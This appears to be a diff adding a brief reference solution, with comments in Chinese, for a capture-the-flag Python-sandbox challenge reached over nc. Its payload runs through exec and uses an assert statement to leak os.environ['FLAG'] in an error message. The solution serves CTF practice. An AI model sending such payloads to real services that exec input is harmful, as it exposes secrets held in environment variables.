@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 exec 执行）：
+
+# exec 模式执行；import 语句与 assert 均无括号，异常消息回显 flag
+import os
+assert 0, os.environ['FLAG']
